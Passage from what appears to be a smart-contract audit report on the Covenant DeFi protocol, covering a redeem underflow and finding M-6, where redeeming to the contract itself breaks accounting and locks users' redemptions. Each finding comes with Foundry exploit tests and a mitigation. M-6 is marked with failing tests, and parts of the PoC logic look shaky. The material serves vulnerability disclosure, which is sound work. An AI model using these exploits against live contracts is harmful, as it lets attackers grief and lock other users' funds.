Scenario: A whitelisted LEX returns amountOut equal to the current baseSupply and a positive protocolFees during redeem. Because ValidationLogic.checkRedeemOutputs only checks amountOut <= baseSupply (ignoring protocolFees), redeem passes validation and then reverts on ms.baseSupply = localBaseSupply - amountOut - protocolFees. previewRedeem mirrors the same validation omission, so it returns a successful quote, misleading users.
Steps:
- Enable a mock LEX and curator; create a market.
- User mints base into the market so baseSupply = X.
- LEX.quoteRedeem and LEX.redeem return (amountOut=X, protocolFees=1).
- previewRedeem succeeds, but redeem reverts due to arithmetic underflow (X - X - 1).

## Proof of Code
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.30;

// Test setup dependencies
import "forge-std/Test.sol";
import {CovenantCurator} from "../../src/curators/CovenantCurator.sol";
import {StubPriceOracle} from "../mocks/StubPriceOracle.sol";
import {MockChainlinkAggregator} from "./mocks/MockChainlinkAggregator.sol";
import {ChainlinkOracle} from "../../src/curators/oracles/chainlink/ChainlinkOracle.sol";
import {MockPyth} from "./mocks/MockPyth.sol";
import {PythOracle} from "../../src/curators/oracles/pyth/PythOracle.sol";

// Several project dependencies that might be useful in PoCs
import {SynthToken} from "../../src/synths/SynthToken.sol";
import {Covenant, MarketId, MarketParams, MarketState, SynthTokens} from "../../src/Covenant.sol";
import {LatentSwapLEX} from "../../src/lex/latentSwap/LatentSwapLEX.sol";
import {LSErrors} from "../../src/lex/latentSwap/libraries/LSErrors.sol";
import {FixedPoint} from "../../src/lex/latentswap/libraries/FixedPoint.sol";
import {DebtMath} from "../../src/lex/latentswap/libraries/DebtMath.sol";
import {ICovenant, IERC20, AssetType, SwapParams, RedeemParams, MintParams} from "../../src/interfaces/ICovenant.sol";
import {ISynthToken} from "../../src/interfaces/ISynthToken.sol";
import {IPriceOracle} from "../../src/interfaces/IPriceOracle.sol";
import {ILiquidExchangeModel} from "../../src/interfaces/ILiquidExchangeModel.sol";
import {ILatentSwapLEX, LexState} from "../../src/lex/latentswap/interfaces/ILatentSwapLEX.sol";
import {MockOracle} from "../mocks/MockOracle.sol";
import {MockERC20} from "../mocks/MockERC20.sol";
import {WadRayMath} from "@aave/libraries/math/WadRayMath.sol";
import {IERC20Metadata} from "@openzeppelin/token/ERC20/extensions/IERC20Metadata.sol";
import {UtilsLib} from "../../src/libraries/Utils.sol";
import {TestMath} from "../utils/TestMath.sol";
import {Events} from "../../src/libraries/Events.sol";
import {Errors} from "../../src/libraries/Errors.sol";
import {LatentSwapLib} from "../../src/periphery/libraries/LatentSwapLib.sol";
import {PercentageMath} from "@aave/libraries/math/PercentageMath.sol";
import {IERC4626} from "forge-std/interfaces/IERC4626.sol";
import {StubERC4626} from "../mocks/StubERC4626.sol";

contract CovenantTest is Test {
    using WadRayMath for uint256;

    // LatentSwapLEX init pricing constants
    uint160 internal constant P_MAX = uint160((1095445 * FixedPoint.Q96) / 1000000); //uint160(Math.sqrt((FixedPoint.Q192 * 12) / 10)); // Edge price of 1.2
    uint160 internal constant P_MIN = uint160(FixedPoint.Q192 / P_MAX);
    uint32 internal constant DURATION = 30 * 24 * 60 * 60;
    uint8 internal constant SWAP_FEE = 0;
    int64 internal constant LN_RATE_BIAS = 5012540000000000; // WAD

    address private _mockOracle;
    address private _mockBaseAsset;
    address private _mockQuoteAsset;
    uint160 private P_LIM_H = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9500);
    uint160 private P_LIM_MAX = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9999);

    // PoC Contract Deployments
    Covenant public covenant;
    LatentSwapLEX public lex;
    CovenantCurator public covenantCurator;
    StubPriceOracle public covenantCuratorOracle;
    MarketId internal _marketId;
    MockChainlinkAggregator public chainlinkAggregator;
    ChainlinkOracle public chainlinkOracle;
    MockPyth public pyth;
    PythOracle public pythOracle;

    ////////////////////////////////////////////////////////////////////////////

    function setUp() public {
        // Deploy mock Oracle
        _mockOracle = address(new MockOracle(address(this)));

        // Deploy mock Base Asset w/ pre-mint
        _mockBaseAsset = address(new MockERC20(address(this), "MockBaseAsset", "MBA", 18));
        MockERC20(_mockBaseAsset).mint(address(this), 100e18);

        // Deploy mock Quote Asset
        _mockQuoteAsset = address(new MockERC20(address(this), "MockQaseAsset", "MQA", 18));

        // Deploy Covenant
        covenant = new Covenant(address(this));

        // Deploy LEX implementation
        lex = new LatentSwapLEX(
            address(this),
            address(covenant),
            P_MAX,
            P_MIN,
            P_LIM_H,
            P_LIM_MAX,
            LN_RATE_BIAS,
            DURATION,
            SWAP_FEE
        );

        // Connect LEX w/ Covenant
        covenant.setEnabledLEX(address(lex), true);

        // Connect mock oracle w/ Covenant
        covenant.setEnabledCurator(_mockOracle, true);

        // Create a mock market
        MarketParams memory marketParams = MarketParams({
            baseToken: _mockBaseAsset,
            quoteToken: _mockQuoteAsset,
            curator: _mockOracle,
            lex: address(lex)
        });
        _marketId = covenant.createMarket(marketParams, hex"");

        // Deploy the Covenant Curator (Oracle Router)
        covenantCurator = new CovenantCurator(address(this));

        // Deploy a *stub* oracle for the Covenant Curator
        covenantCuratorOracle = new StubPriceOracle();

        // Link *stub* oracle with mock base and quote assets
        covenantCurator.govSetConfig(_mockBaseAsset, _mockQuoteAsset, address(covenantCuratorOracle));

        // Deploy mock Chainlink Aggregator
        chainlinkAggregator = new MockChainlinkAggregator(8);

        // Deploy Chainlink Oracle
        chainlinkOracle = new ChainlinkOracle(_mockBaseAsset, _mockQuoteAsset, address(chainlinkAggregator), 1 hours);

        // Deploy mock Pyth
        pyth = new MockPyth();

        // Deploy Pyth Oracle
        pythOracle = new PythOracle(
            address(pyth),
            _mockBaseAsset,
            _mockQuoteAsset,
            bytes32(uint256(196)),
            10 minutes,
            250
        );
    }

    function test_submissionValidity() public {
        // Step 1: Mint base tokens into the market so baseSupply = X
        uint256 mintAmount = 100e18;
        MockERC20(_mockBaseAsset).approve(address(covenant), mintAmount);
        
        MarketParams memory mp = MarketParams({
            baseToken: _mockBaseAsset,
            quoteToken: _mockQuoteAsset,
            curator: _mockOracle,
            lex: address(lex)
        });
        
        MintParams memory mintParams = MintParams({
            marketId: _marketId,
            marketParams: mp,
            baseAmountIn: mintAmount,
            to: address(this),
            minATokenAmountOut: 0,
            minZTokenAmountOut: 0,
            data: hex"",
            msgValue: 0
        });
        
        covenant.mint(mintParams);
        
        // Get current baseSupply
        MarketState memory ms = covenant.getMarketState(_marketId);
        uint256 currentBaseSupply = ms.baseSupply;
        
        console.log("Current baseSupply:", currentBaseSupply);
        
        // Get synth tokens
        SynthTokens memory synthTokens = lex.getSynthTokens(_marketId);
        
        // Get some aTokens and zTokens to redeem
        uint256 aTokenBalance = IERC20(synthTokens.aToken).balanceOf(address(this));
        uint256 zTokenBalance = IERC20(synthTokens.zToken).balanceOf(address(this));
        
        console.log("aToken balance:", aTokenBalance);
        console.log("zToken balance:", zTokenBalance);
        
        // Try to preview redeem - this should succeed
        RedeemParams memory redeemParams = RedeemParams({
            marketId: _marketId,
            marketParams: mp,
            aTokenAmountIn: aTokenBalance,
            zTokenAmountIn: zTokenBalance,
            to: address(this),
            minAmountOut: 0,
            data: hex"",
            msgValue: 0
        });
        
        // Preview should succeed
        (uint256 previewAmountOut, uint128 previewProtocolFees,,) = covenant.previewRedeem(redeemParams);
        console.log("Preview amountOut:", previewAmountOut);
        console.log("Preview protocolFees:", previewProtocolFees);
        
        // Check if previewAmountOut + previewProtocolFees > currentBaseSupply
        if (previewAmountOut + previewProtocolFees > currentBaseSupply) {
            console.log("VULNERABILITY DETECTED: amountOut + protocolFees > baseSupply");
            console.log("This will cause underflow in redeem");
            
            // Try to execute redeem - this should revert due to underflow
            vm.expectRevert();
            covenant.redeem(redeemParams);
            
            console.log("SUCCESS: Demonstrated that previewRedeem succeeds but redeem reverts");
        } else {
            // If not at boundary yet, let's try to get there by minting more and then redeeming all
            console.log("Not at boundary condition yet, attempting to create it...");
            
            // Mint more to increase baseSupply
            MockERC20(_mockBaseAsset).mint(address(this), 1000e18);
            MockERC20(_mockBaseAsset).approve(address(covenant), 1000e18);
            
            MintParams memory mintParams2 = MintParams({
                marketId: _marketId,
                marketParams: mp,
                baseAmountIn: 1000e18,
                to: address(this),
                minATokenAmountOut: 0,
                minZTokenAmountOut: 0,
                data: hex"",
                msgValue: 0
            });
            
            covenant.mint(mintParams2);
            
            // Get updated balances
            ms = covenant.getMarketState(_marketId);
            currentBaseSupply = ms.baseSupply;
            aTokenBalance = IERC20(synthTokens.aToken).balanceOf(address(this));
            zTokenBalance = IERC20(synthTokens.zToken).balanceOf(address(this));
            
            console.log("Updated baseSupply:", currentBaseSupply);
            console.log("Updated aToken balance:", aTokenBalance);
            console.log("Updated zToken balance:", zTokenBalance);
            
            // Try redeeming all tokens
            RedeemParams memory redeemParams2 = RedeemParams({
                marketId: _marketId,
                marketParams: mp,
                aTokenAmountIn: aTokenBalance,
                zTokenAmountIn: zTokenBalance,
                to: address(this),
                minAmountOut: 0,
                data: hex"",
                msgValue: 0
            });
            
            (uint256 previewAmountOut2, uint128 previewProtocolFees2,,) = covenant.previewRedeem(redeemParams2);
            console.log("Preview amountOut (full redeem):", previewAmountOut2);
            console.log("Preview protocolFees (full redeem):", previewProtocolFees2);
            
            // Check if we hit the boundary condition
            if (previewAmountOut2 + previewProtocolFees2 > currentBaseSupply) {
                console.log("VULNERABILITY CONFIRMED: amountOut + protocolFees > baseSupply");
                console.log("Difference:", (previewAmountOut2 + previewProtocolFees2) - currentBaseSupply);
                
                // This should revert
                vm.expectRevert();
                covenant.redeem(redeemParams2);
                
                console.log("SUCCESS: Demonstrated that previewRedeem succeeds but redeem reverts");
            }
        }
    }
}

## Suggested Mitigation
Enforce the redeem invariant to include protocolFees. Either: (A) Extend ValidationLogic.checkRedeemOutputs to accept protocolFees and require amountOut + protocolFees <= baseSupply (mirroring swap’s check), and update both Covenant.redeem and Covenant.previewRedeem to pass protocolFees into the check; or (B) Add an inline bound in Covenant.redeem and Covenant.previewRedeem before state update/return: require(amountOut + protocolFees <= localBaseSupply, Errors.E_InsufficientAmount()). This prevents underflow, DoS, and preview/redeem mismatches.





 **Derived From** : Let S := marketState[marketId].baseSupply + marketState[marketId].protocolFeeGrowth and B := IERC20(redeemParams.marketParams.baseToken).balanceOf(address(this)); Then (S_post - S_pre) == (B_post - B_pre)

## [M-6]. Redeeming to Covenant itself black-holes funds and breaks ΔS == ΔB balance invariant

## Derived From Pattern/Invariant
Let S := marketState[marketId].baseSupply + marketState[marketId].protocolFeeGrowth and B := IERC20(redeemParams.marketParams.baseToken).balanceOf(address(this)); Then (S_post - S_pre) == (B_post - B_pre)

## Exploit Type
AccountingInvariantViolation

## Location
Covenant.redeem

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: FailingTests
## Minimim Privilege Required:Permissionless


## Description
Covenant.redeem updates accounting first, then transfers base tokens: ms.baseSupply = localBaseSupply - amountOut - protocolFees; ms.protocolFeeGrowth += protocolFees; IERC20(mp.baseToken).safeTransfer(redeemParams.to, amountOut). If redeemParams.to == address(this), most ERC20s allow self-transfer which results in no net change to the contract’s token balance (B_post == B_pre), but ms.baseSupply is reduced by amountOut (and protocol fees moved to growth). This permanently desynchronizes accounting from actual balances: ΔS = -amountOut while ΔB = 0, violating the stated invariant. Worse, the transferred base tokens remain stuck in the contract and are no longer redeemable by users, causing a denial-of-redemption despite sufficient actual token balances. There is no validation preventing to == address(this) in redeem (unlike collectProtocolFee which forbids recipient == address(this)).

## Impact
Any user can set redeemParams.to = address(this) (and similarly swap with assetOut == BASE and to = address(this)) to decrement marketState.baseSupply without reducing the contract’s actual base-token balance. This permanently desynchronizes accounting (S decreases while B stays constant), black-holing the transferred amount inside the contract and reducing redeem capacity for honest users by the same amount. The attack is a griefing vector that requires the attacker to source/burn a/z tokens (e.g., by minting or swapping), i.e., they pay to create the DoS, but the protocol’s functionality and user withdrawals are still materially impacted.

## Command to Run Test
forge test --match-path test/poc/M-Redeeming-to-Covenant-itself-black-holes.t.sol -vvv

## Proof of Concept
1) Create a market and seed Covenant with 100 base tokens via mint(). 2) Attacker calls redeem(..., to = address(covenant)) with amountOut = 40. 3) Accounting: baseSupply decreases by 40; protocolFeeGrowth unchanged if 0 fees; token transfer to self results in no balance change. Invariant breaks: ΔS = -40, ΔB = 0. 4) A victim then tries to redeem 70 base tokens. Although the contract actually holds 100 tokens, baseSupply is only 60, so ValidationLogic.checkRedeemOutputs() reverts with E_InsufficientAmount. The 40 tokens are stuck and unreachable to users.

## Proof of Code
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.30;

// Test setup dependencies
import "forge-std/Test.sol";
import {CovenantCurator} from "../../src/curators/CovenantCurator.sol";
import {StubPriceOracle} from "../mocks/StubPriceOracle.sol";
import {MockChainlinkAggregator} from "./mocks/MockChainlinkAggregator.sol";
import {ChainlinkOracle} from "../../src/curators/oracles/chainlink/ChainlinkOracle.sol";
import {MockPyth} from "./mocks/MockPyth.sol";
import {PythOracle} from "../../src/curators/oracles/pyth/PythOracle.sol";

// Several project dependencies that might be useful in PoCs
import {SynthToken} from "../../src/synths/SynthToken.sol";
import {Covenant, MarketId, MarketParams, MarketState, SynthTokens} from "../../src/Covenant.sol";
import {LatentSwapLEX} from "../../src/lex/latentSwap/LatentSwapLEX.sol";
import {LSErrors} from "../../src/lex/latentSwap/libraries/LSErrors.sol";
import {FixedPoint} from "../../src/lex/latentswap/libraries/FixedPoint.sol";
import {DebtMath} from "../../src/lex/latentswap/libraries/DebtMath.sol";
import {ICovenant, IERC20, AssetType, SwapParams, RedeemParams, MintParams} from "../../src/interfaces/ICovenant.sol";
import {ISynthToken} from "../../src/interfaces/ISynthToken.sol";
import {IPriceOracle} from "../../src/interfaces/IPriceOracle.sol";
import {ILiquidExchangeModel} from "../../src/interfaces/ILiquidExchangeModel.sol";
import {ILatentSwapLEX, LexState} from "../../src/lex/latentswap/interfaces/ILatentSwapLEX.sol";
import {MockOracle} from "../mocks/MockOracle.sol";
import {MockERC20} from "../mocks/MockERC20.sol";
import {WadRayMath} from "@aave/libraries/math/WadRayMath.sol";
import {IERC20Metadata} from "@openzeppelin/token/ERC20/extensions/IERC20Metadata.sol";
import {UtilsLib} from "../../src/libraries/Utils.sol";
import {TestMath} from "../utils/TestMath.sol";
import {Events} from "../../src/libraries/Events.sol";
import {Errors} from "../../src/libraries/Errors.sol";
import {LatentSwapLib} from "../../src/periphery/libraries/LatentSwapLib.sol";
import {PercentageMath} from "@aave/libraries/math/PercentageMath.sol";
import {IERC4626} from "forge-std/interfaces/IERC4626.sol";
import {StubERC4626} from "../mocks/StubERC4626.sol";

contract CovenantTest is Test {
    using WadRayMath for uint256;

    // LatentSwapLEX init pricing constants
    uint160 internal constant P_MAX = uint160((1095445 * FixedPoint.Q96) / 1000000); //uint160(Math.sqrt((FixedPoint.Q192 * 12) / 10)); // Edge price of 1.2
    uint160 internal constant P_MIN = uint160(FixedPoint.Q192 / P_MAX);
    uint32 internal constant DURATION = 30 * 24 * 60 * 60;
    uint8 internal constant SWAP_FEE = 0;
    int64 internal constant LN_RATE_BIAS = 5012540000000000; // WAD

    address private _mockOracle;
    address private _mockBaseAsset;
    address private _mockQuoteAsset;
    uint160 private P_LIM_H = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9500);
    uint160 private P_LIM_MAX = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9999);

    // PoC Contract Deployments
    Covenant public covenant;
    LatentSwapLEX public lex;
    CovenantCurator public covenantCurator;
    StubPriceOracle public covenantCuratorOracle;
    MarketId internal _marketId;
    MockChainlinkAggregator public chainlinkAggregator;
    ChainlinkOracle public chainlinkOracle;
    MockPyth public pyth;
    PythOracle public pythOracle;

    ////////////////////////////////////////////////////////////////////////////

    function setUp() public {
        // Deploy mock Oracle
        _mockOracle = address(new MockOracle(address(this)));

        // Deploy mock Base Asset w/ pre-mint
        _mockBaseAsset = address(new MockERC20(address(this), "MockBaseAsset", "MBA", 18));
        MockERC20(_mockBaseAsset).mint(address(this), 100e18);

        // Deploy mock Quote Asset
        _mockQuoteAsset = address(new MockERC20(address(this), "MockQaseAsset", "MQA", 18));

        // Deploy Covenant
        covenant = new Covenant(address(this));

        // Deploy LEX implementation
        lex = new LatentSwapLEX(
            address(this),
            address(covenant),
            P_MAX,
            P_MIN,
            P_LIM_H,
            P_LIM_MAX,
            LN_RATE_BIAS,
            DURATION,
            SWAP_FEE
        );

        // Connect LEX w/ Covenant
        covenant.setEnabledLEX(address(lex), true);

        // Connect mock oracle w/ Covenant
        covenant.setEnabledCurator(_mockOracle, true);

        // Create a mock market
        MarketParams memory marketParams = MarketParams({
            baseToken: _mockBaseAsset,
            quoteToken: _mockQuoteAsset,
            curator: _mockOracle,
            lex: address(lex)
        });
        _marketId = covenant.createMarket(marketParams, hex"");

        // Deploy the Covenant Curator (Oracle Router)
        covenantCurator = new CovenantCurator(address(this));

        // Deploy a *stub* oracle for the Covenant Curator
        covenantCuratorOracle = new StubPriceOracle();

        // Link *stub* oracle with mock base and quote assets
        covenantCurator.govSetConfig(_mockBaseAsset, _mockQuoteAsset, address(covenantCuratorOracle));

        // Deploy mock Chainlink Aggregator
        chainlinkAggregator = new MockChainlinkAggregator(8);

        // Deploy Chainlink Oracle
        chainlinkOracle = new ChainlinkOracle(_mockBaseAsset, _mockQuoteAsset, address(chainlinkAggregator), 1 hours);

        // Deploy mock Pyth
        pyth = new MockPyth();

        // Deploy Pyth Oracle
        pythOracle = new PythOracle(
            address(pyth),
            _mockBaseAsset,
            _mockQuoteAsset,
            bytes32(uint256(196)),
            10 minutes,
            250
        );
    }

    function test_submissionValidity() public {
        // Step 1: Mint tokens to seed the market with 100 base tokens
        MockERC20(_mockBaseAsset).approve(address(covenant), 100e18);
        
        MarketParams memory mp = MarketParams({
            baseToken: _mockBaseAsset,
            quoteToken: _mockQuoteAsset,
            curator: _mockOracle,
            lex: address(lex)
        });
        
        MintParams memory mintParams = MintParams({
            marketId: _marketId,
            marketParams: mp,
            baseAmountIn: 100e18,
            to: address(this),
            minATokenAmountOut: 0,
            minZTokenAmountOut: 0,
            data: hex"",
            msgValue: 0
        });
        
        covenant.mint(mintParams);
        
        // Record initial state
        MarketState memory stateBefore = covenant.getMarketState(_marketId);
        uint256 baseSupplyBefore = stateBefore.baseSupply;
        uint256 contractBalanceBefore = IERC20(_mockBaseAsset).balanceOf(address(covenant));
        
        // Verify initial invariant: baseSupply should equal contract balance (ignoring protocol fees for simplicity)
        assertEq(baseSupplyBefore, contractBalanceBefore, "Initial invariant broken");
        
        // Step 2: Get synth tokens to redeem
        SynthTokens memory synthTokens = lex.getSynthTokens(_marketId);
        uint256 aTokenBalance = IERC20(synthTokens.aToken).balanceOf(address(this));
        uint256 zTokenBalance = IERC20(synthTokens.zToken).balanceOf(address(this));
        
        // Use a portion of tokens for redeem (40 base tokens worth)
        uint256 redeemAmount = 20e18; // Use half of each token type
        
        // Step 3: Attacker redeems to covenant address itself
        RedeemParams memory redeemParams = RedeemParams({
            marketId: _marketId,
            marketParams: mp,
            aTokenAmountIn: redeemAmount,
            zTokenAmountIn: redeemAmount,
            to: address(covenant), // CRITICAL: redeeming to covenant itself
            minAmountOut: 0,
            data: hex"",
            msgValue: 0
        });
        
        uint256 amountOut = covenant.redeem(redeemParams);
        
        // Step 4: Verify the invariant is broken
        MarketState memory stateAfter = covenant.getMarketState(_marketId);
        uint256 baseSupplyAfter = stateAfter.baseSupply;
        uint256 contractBalanceAfter = IERC20(_mockBaseAsset).balanceOf(address(covenant));
        
        // Calculate deltas
        int256 deltaSupply = int256(baseSupplyAfter) - int256(baseSupplyBefore);
        int256 deltaBalance = int256(contractBalanceAfter) - int256(contractBalanceBefore);
        
        // The invariant states: ΔS == ΔB
        // But when redeeming to self, ΔS = -amountOut (supply decreased)
        // while ΔB = 0 (balance unchanged because self-transfer)
        
        console.log("Amount redeemed:", amountOut);
        console.log("Base supply before:", baseSupplyBefore);
        console.log("Base supply after:", baseSupplyAfter);
        console.log("Contract balance before:", contractBalanceBefore);
        console.log("Contract balance after:", contractBalanceAfter);
        console.log("Delta supply:", uint256(deltaSupply < 0 ? -deltaSupply : deltaSupply));
        console.log("Delta balance:", uint256(deltaBalance < 0 ? -deltaBalance : deltaBalance));
        
        // Verify invariant is broken
        assertTrue(deltaSupply != deltaBalance, "Invariant should be broken");
        assertTrue(deltaSupply < 0, "Supply should have decreased");
        assertTrue(deltaBalance == 0, "Balance should be unchanged (self-transfer)");
        
        // Step 5: Demonstrate that funds are now stuck
        // The baseSupply decreased but actual tokens remain in contract
        uint256 stuckTokens = contractBalanceAfter - baseSupplyAfter;
        assertTrue(stuckTokens > 0, "Tokens should be stuck in contract");
        console.log("Stuck tokens:", stuckTokens);
        
        // Step 6: Demonstrate DoS - try to redeem remaining tokens
        // A victim tries to redeem but will fail because baseSupply is artificially low
        uint256 remainingATokens = IERC20(synthTokens.aToken).balanceOf(address(this));
        uint256 remainingZTokens = IERC20(synthTokens.zToken).balanceOf(address(this));
        
        if (remainingATokens > 0 && remainingZTokens > 0) {
            RedeemParams memory victimRedeemParams = RedeemParams({
                marketId: _marketId,
                marketParams: mp,
                aTokenAmountIn: remainingATokens,
                zTokenAmountIn: remainingZTokens,
                to: address(this),
                minAmountOut: 0,
                data: hex"",
                msgValue: 0
            });
            
            // This should revert with E_InsufficientAmount because baseSupply is too low
            // even though the contract actually has enough tokens
            vm.expectRevert(Errors.E_InsufficientAmount.selector);
            covenant.redeem(victimRedeemParams);
        }
        
        console.log("PoC complete: Invariant broken, funds stuck, DoS demonstrated");
    }
}

## Suggested Mitigation
In Covenant.redeem add a guard to forbid self-transfers: if (redeemParams.to == address(this)) revert Errors.E_Unauthorized();. Likewise in Covenant.swap, when swapParams.assetOut == AssetType.BASE, enforce if (swapParams.to == address(this)) revert Errors.E_Unauthorized();. Optionally, mirror these checks in ValidationLogic to ensure consistency in preview functions. This fully preserves the intended ΔS == ΔB relation for base outflows and prevents griefing via self-transfers.



